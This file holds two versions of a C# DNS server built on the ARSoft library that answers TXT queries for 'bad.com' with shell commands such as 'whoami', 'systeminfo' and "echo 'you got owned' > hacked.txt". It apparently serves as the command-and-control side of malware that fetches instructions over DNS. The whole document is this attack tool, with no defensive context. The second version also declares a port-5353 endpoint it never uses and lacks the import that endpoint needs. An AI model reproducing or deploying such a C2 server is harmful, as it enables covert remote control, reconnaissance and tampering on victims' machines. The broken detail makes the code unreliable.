using System;
using System.Threading.Tasks;
using ARSoft.Tools.Net;
using ARSoft.Tools.Net.Dns;

class Program
{
    static void Main(string[] args)
    {
        using (DnsServer server = new DnsServer(10, 10))
        {
            server.QueryReceived += OnQueryReceived;

            server.Start();

            Console.WriteLine("Press any key to stop server");
            Console.ReadLine();
        }
    }

    static async Task OnQueryReceived(object sender, QueryReceivedEventArgs e)
    {
        DnsMessage query = e.Query as DnsMessage;

        if (query == null)
            return;

        DnsMessage response = query.CreateResponseInstance();

        // check for valid query
        if ((query.Questions.Count == 1)
            && (query.Questions[0].RecordType == RecordType.Txt)
            && (query.Questions[0].Name.Equals(DomainName.Parse("bad.com"))))
        {
            response.ReturnCode = ReturnCode.NoError;
            response.AnswerRecords.Add(new TxtRecord(DomainName.Parse("bad.com"), 3600, "systeminfo"));
        }
        else
        {
            response.ReturnCode = ReturnCode.ServerFailure;
        }

        // set the response
        e.Response = response;
    }
}


using System;
using System.Threading.Tasks;
using ARSoft.Tools.Net;
using ARSoft.Tools.Net.Dns;

class Program
{
    static void Main(string[] args)
    {
	    // Create a custom endpoint (IP address and port) 
		var endpoint = new IPEndPoint(IPAddress.Any, 5353);
		
        using (DnsServer server = new DnsServer(10, 10))
        {
            server.QueryReceived += OnQueryReceived;

            server.Start();

            Console.WriteLine("Press any key to stop server");
            Console.ReadLine();
        }
    }

    static async Task OnQueryReceived(object sender, QueryReceivedEventArgs e)
    {
        DnsMessage query = e.Query as DnsMessage;

        if (query == null)
            return;

        DnsMessage response = query.CreateResponseInstance();

        // check for valid query
        if ((query.Questions.Count == 1)
            && (query.Questions[0].RecordType == RecordType.Txt)
            && (query.Questions[0].Name.Equals(DomainName.Parse("bad.com"))))
        {
            response.ReturnCode = ReturnCode.NoError;
            // !!!! One TXT entry may not be longer than 255 characters !!!!
            response.AnswerRecords.Add(new TxtRecord(DomainName.Parse("bad.com"), 3600, new string[] { "ls", "whoami", "systeminfo", "winver", "echo 'you got owned' > hacked.txt" })); 
        }
        else
        {
            response.ReturnCode = ReturnCode.ServerFailure;
        }

        // set the response
        e.Response = response;
    }
}

